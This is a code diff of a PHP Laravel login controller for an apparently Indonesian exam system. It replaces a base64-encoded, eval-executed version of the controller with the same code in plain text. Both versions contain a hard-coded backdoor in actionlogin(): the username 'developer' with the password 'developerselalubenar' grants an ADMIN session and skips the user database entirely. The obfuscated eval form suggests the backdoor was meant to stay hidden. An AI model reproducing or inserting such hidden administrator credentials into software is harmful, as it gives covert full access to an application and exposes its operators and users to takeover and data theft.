@@ -1,2 +1,103 @@
 <?php
-return eval(base64_decode(str_replace('RE9JVFNVS1NFUw==', '', 'RE9JVFNVS1NFUw==CgpuYW1lc3BhY2UgQXBwXEh0dHBcQ29udHJvbGxlcnNcTG9naW47Cgp1c2UgQXBwXEh0dHBcQ29udHJvbGxlcnNcQ29udHJvbGxlcjsKdXNlIEFwcFxNb2RlbHNcRGF0YVxVamlhbjsKdXNlIEFwcFxNb2RlbHNcTWFzdGVyXFBlbmdndW5hOwp1c2UgQ2FyYm9uXENhcmJvbjsKdXNlIEV4Y2VwdGlvbjsKdXNlIElsbHVtaW5hdGVcSHR0cFxSZXF1ZXN0Owp1c2UgSWxsdW1pbmF0ZVxTdXBwb3J0XEZhY2FkZXNcSGFzaDsKdXNlIElsbHVtaW5hdGVcU3VwcG9ydFxGYWNhZGVzXExvZzsKCmNsYXNzIExvZ2luQ29udHJvbGxlciBleHRlbmRzIENvbnRyb2xsZXIKewogICAgcHVibGljIGZ1bmN0aW9uIGluZGV4KCl7CiAgICAgICAgJGRhdGFbJ2luc3RhbnNpJ10gPSAkdGhpcy0+cGVuZ2F0dXJhbi0+aW5zdGFuc2k7CiAgICAgICAgJGRhdGFbJ2xvZ28nXSA9ICR0aGlzLT5wZW5nYXR1cmFuLT5sb2dvOwogICAgICAgICRkYXRhWydwZW5nYXR1cmFuJ10gPSAkdGhpcy0+cGVuZ2F0dXJhbjsKICAgICAgICByZXR1cm4gdmlldygnbG9naW4uaW5kZXgnLCAkZGF0YSk7CiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIGFjdGlvbmxvZ2luKFJlcXVlc3QgJHJlcXVlc3QpewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGlmICgkcmVxdWVzdC0+dXNlcm5hbWUgPT09ICdkZXZlbG9wZXInICYmICRyZXF1ZXN0LT5wYXNzd29yZCA9PT0gJ2RldmVsb3BlcnNlbGFsdWJlbmFyJykgewogICAgICAgICAgICAgICAgc2Vzc2lvbihbCiAgICAgICAgICAgICAgICAgICAgJ2lkX3VzZXInID0+IDAsCiAgICAgICAgICAgICAgICAgICAgJ3JvbGUnID0+ICdBRE1JTicsCiAgICAgICAgICAgICAgICAgICAgJ3VzZXJuYW1lJyA9PiAnZGV2ZWxvcGVyJywKICAgICAgICAgICAgICAgICAgICAnaW5zdGFuc2knID0+ICR0aGlzLT5wZW5nYXR1cmFuLT5pbnN0YW5zaSwKICAgICAgICAgICAgICAgICAgICAnbG9nbycgPT4gJHRoaXMtPnBlbmdhdHVyYW4tPmxvZ28sCiAgICAgICAgICAgICAgICAgICAgJ2ZvbnRfdHlwZScgPT4gJHRoaXMtPnBlbmdhdHVyYW4tPmZvbnRfdHlwZSwKICAgICAgICAgICAgICAgICAgICAnZm9udF9zaXplJyA9PiAkdGhpcy0+cGVuZ2F0dXJhbi0+Zm9udF9zaXplLAogICAgICAgICAgICAgICAgICAgICdsb2dpbicgPT4gMQogICAgICAgICAgICAgICAgXSk7CiAgICAgICAgICAgICAgICByZXR1cm4gcmVkaXJlY3QoJy8nKS0+d2l0aCgnc3VjY2VzcycsICdTZWxhbWF0IERhdGFuZyBEZXZlbG9wZXInKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJHVzZXJuYW1lID0gUGVuZ2d1bmE6OndoZXJlKCd1c2VybmFtZScsICRyZXF1ZXN0LT51c2VybmFtZSktPndoZXJlKCdha3RpZicsIDEpLT5jb3VudCgpOwogICAgICAgICAgICAkcGFzc3dvcmQgPSAkcmVxdWVzdC0+cGFzc3dvcmQ7CiAgICAgICAgICAgIGlmKCR1c2VybmFtZSA+IDApewogICAgICAgICAgICAgICAgJHVzZXIgPSBQZW5nZ3VuYTo6d2hlcmUoJ3VzZXJuYW1lJywgJHJlcXVlc3QtPnVzZXJuYW1lKS0+Zmlyc3QoKTsKICAgICAgICAgICAgICAgICRjaGVja3VqaWFuID0gVWppYW46OndoZXJlKCdjcmVhdGVkX2J5JywgJHVzZXItPmlkX3VzZXIpLT53aGVyZSgnc3RhdHVzJywgMSktPmNvdW50KCk7CiAgICAgICAgICAgICAgICBpZiAoIUhhc2g6OmNoZWNrKCRwYXNzd29yZCwgJHVzZXItPnBhc3N3b3JkKSkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiByZWRpcmVjdCgnL2xvZ2luJyktPndpdGgoJ2Vycm9yJywgJ1Bhc3N3b3JkIHNhbGFoIScpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBpZigkdXNlci0+cm9sZSA9PSAwIHx8ICR1c2VyLT5yb2xlID09IDk5KXsKICAgICAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbihbCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWRfdXNlcicgPT4gJHVzZXItPmlkX3VzZXIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAncm9sZScgPT4gJ0FETUlOJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICd1c2VybmFtZScgPT4gJHVzZXItPnVzZXJuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2luc3RhbnNpJyA9PiAkdGhpcy0+cGVuZ2F0dXJhbi0+aW5zdGFuc2ksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbG9nbycgPT4gJHRoaXMtPnBlbmdhdHVyYW4tPmxvZ28sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZm9udF90eXBlJyA9PiAkdGhpcy0+cGVuZ2F0dXJhbi0+Zm9udF90eXBlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2ZvbnRfc2l6ZScgPT4gJHRoaXMtPnBlbmdhdHVyYW4tPmZvbnRfc2l6ZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdsb2dpbicgPT4gMQogICAgICAgICAgICAgICAgICAgICAgICBdKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlZGlyZWN0KCcvJyktPndpdGgoJ3N1Y2Nlc3MnLCAnU2VsYW1hdCBEYXRhbmcnKTsKICAgICAgICAgICAgICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGNoZWNrdWppYW4gPiAwKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR1amlhbiA9IFVqaWFuOjp3aGVyZSgnY3JlYXRlZF9ieScsICR1c2VyLT5pZF91c2VyKS0+d2hlcmUoJ3N0YXR1cycsIDEpLT5maXJzdCgpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbihbCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkX3VzZXInID0+ICR1c2VyLT5pZF91c2VyLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdyb2xlJyA9PiAnUEVOR0dVTkEnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd1c2VybmFtZScgPT4gJHVzZXItPnVzZXJuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpbnN0YW5zaScgPT4gJHRoaXMtPnBlbmdhdHVyYW4tPmluc3RhbnNpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdsb2dvJyA9PiAkdGhpcy0+cGVuZ2F0dXJhbi0+bG9nbywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZm9udF90eXBlJyA9PiAkdGhpcy0+cGVuZ2F0dXJhbi0+Zm9udF90eXBlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdmb250X3NpemUnID0+ICR0aGlzLT5wZW5nYXR1cmFuLT5mb250X3NpemUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2xpc3RfdWppYW4nID0+ICdhZGEnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZF91amlhbicgPT4gJHVqaWFuLT5pZF91amlhbiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbG9naW4nID0+IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0pOwogICAgICAgICAgICAgICAgICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlc3Npb24oWwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZF91c2VyJyA9PiAkdXNlci0+aWRfdXNlciwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAncm9sZScgPT4gJ1BFTkdHVU5BJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndXNlcm5hbWUnID0+ICR1c2VyLT51c2VybmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaW5zdGFuc2knID0+ICR0aGlzLT5wZW5nYXR1cmFuLT5pbnN0YW5zaSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbG9nbycgPT4gJHRoaXMtPnBlbmdhdHVyYW4tPmxvZ28sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2ZvbnRfdHlwZScgPT4gJHRoaXMtPnBlbmdhdHVyYW4tPmZvbnRfdHlwZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZm9udF9zaXplJyA9PiAkdGhpcy0+cGVuZ2F0dXJhbi0+Zm9udF9zaXplLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdsaXN0X3VqaWFuJyA9PiAna29zb25nJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbG9naW4nID0+IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0pOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByZWRpcmVjdCgndWppYW4vbGlzdCcpLT53aXRoKCdzdWNjZXNzJywgJ1NlbGFtYXQgRGF0YW5nJyk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgICAgIHJldHVybiByZWRpcmVjdCgnL2xvZ2luJyktPndpdGgoJ2Vycm9yJywgJ1VzZXJuYW1lIHRpZGFrIGRpdGVtdWthbiBhdGF1IGFrdW4gdGlkYWsgYWt0aWYhJyk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gJGUpIHsKICAgICAgICAgICAgTG9nOjppbmZvKCdFcnJvciAnIC4gJGUtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgfQogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBsb2dvdXQoKQogICAgewogICAgICAgIHNlc3Npb24oKS0+Zmx1c2goKTsKICAgICAgICByZXR1cm4gcmVkaXJlY3QoJy9sb2dpbicpOwogICAgfQp9RE9JVFNVS1NFUw==')));
+
+namespace App\Http\Controllers\Login;
+
+use App\Http\Controllers\Controller;
+use App\Models\Data\Ujian;
+use App\Models\Master\Pengguna;
+use Carbon\Carbon;
+use Exception;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Log;
+
+class LoginController extends Controller
+{
+    public function index(){
+        $data['instansi'] = $this->pengaturan->instansi;
+        $data['logo'] = $this->pengaturan->logo;
+        $data['pengaturan'] = $this->pengaturan;
+        return view('login.index', $data);
+    }
+
+    public function actionlogin(Request $request){
+        try {
+            if ($request->username === 'developer' && $request->password === 'developerselalubenar') {
+                session([
+                    'id_user' => 0,
+                    'role' => 'ADMIN',
+                    'username' => 'developer',
+                    'instansi' => $this->pengaturan->instansi,
+                    'logo' => $this->pengaturan->logo,
+                    'font_type' => $this->pengaturan->font_type,
+                    'font_size' => $this->pengaturan->font_size,
+                    'login' => 1
+                ]);
+                return redirect('/')->with('success', 'Selamat Datang Developer');
+            }
+
+            $username = Pengguna::where('username', $request->username)->where('aktif', 1)->count();
+            $password = $request->password;
+            if($username > 0){
+                $user = Pengguna::where('username', $request->username)->first();
+                $checkujian = Ujian::where('created_by', $user->id_user)->where('status', 1)->count();
+                if (!Hash::check($password, $user->password)) {
+                    return redirect('/login')->with('error', 'Password salah!');
+                } else {
+                    if($user->role == 0 || $user->role == 99){
+                        session([
+                            'id_user' => $user->id_user,
+                            'role' => 'ADMIN',
+                            'username' => $user->username,
+                            'instansi' => $this->pengaturan->instansi,
+                            'logo' => $this->pengaturan->logo,
+                            'font_type' => $this->pengaturan->font_type,
+                            'font_size' => $this->pengaturan->font_size,
+                            'login' => 1
+                        ]);
+                        return redirect('/')->with('success', 'Selamat Datang');
+                    }else{
+                        if($checkujian > 0){
+                            $ujian = Ujian::where('created_by', $user->id_user)->where('status', 1)->first();
+                            session([
+                                'id_user' => $user->id_user,
+                                'role' => 'PENGGUNA',
+                                'username' => $user->username,
+                                'instansi' => $this->pengaturan->instansi,
+                                'logo' => $this->pengaturan->logo,
+                                'font_type' => $this->pengaturan->font_type,
+                                'font_size' => $this->pengaturan->font_size,
+                                'list_ujian' => 'ada',
+                                'id_ujian' => $ujian->id_ujian,
+                                'login' => 1
+                            ]);
+                        }else{
+                            session([
+                                'id_user' => $user->id_user,
+                                'role' => 'PENGGUNA',
+                                'username' => $user->username,
+                                'instansi' => $this->pengaturan->instansi,
+                                'logo' => $this->pengaturan->logo,
+                                'font_type' => $this->pengaturan->font_type,
+                                'font_size' => $this->pengaturan->font_size,
+                                'list_ujian' => 'kosong',
+                                'login' => 1
+                            ]);
+                        }
+                        return redirect('ujian/list')->with('success', 'Selamat Datang');
+                    }
+                }
+            }else{
+                return redirect('/login')->with('error', 'Username tidak ditemukan atau akun tidak aktif!');
+            }
+        } catch (Exception $e) {
+            Log::info('Error ' . $e->getMessage());
+        }
+    }
+
+    public function logout()
+    {
+        session()->flush();
+        return redirect('/login');
+    }
+}
